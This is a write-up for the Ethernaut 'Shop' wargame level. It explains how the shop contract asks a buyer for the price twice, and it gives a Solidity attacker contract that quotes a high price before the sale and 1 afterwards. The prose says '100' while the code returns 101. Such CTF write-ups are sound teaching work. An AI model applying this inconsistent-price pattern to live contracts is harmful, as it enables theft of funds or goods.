---
layout: writeup
title: "Shop"
level: "Intermediate"
category: "Ethernaut"
description: "The shop sells an item for 100.Mission is to "scam" the shop into selling it to you for almost nothing
"
---

## Analysis
The main issue is that the `Shop` contract performs two external calls to an untrusted contract `Buyer` to get the same information.


**The Flaw:**  
The Shop is a bit forgetful. When you try to buy the item, it asks you for the price twice.

First, to check if you can afford it or not.

Second, to decide how much to actually charge you.

---

## Solution

Since the Shop updates its status to isSold = true right after the first check, we can create a "two-faced" contract.
When the Shop asks the first time, we check isSold. It’s false, so we say "100."
When the Shop asks the second time, we check isSold again. It’s now true, so we say "1.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttacker {
    IShop public shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 101;
        } else {
            return 1;
        }
    }

    function attack() external {
        shop.buy();
    }
}


</code></pre>

---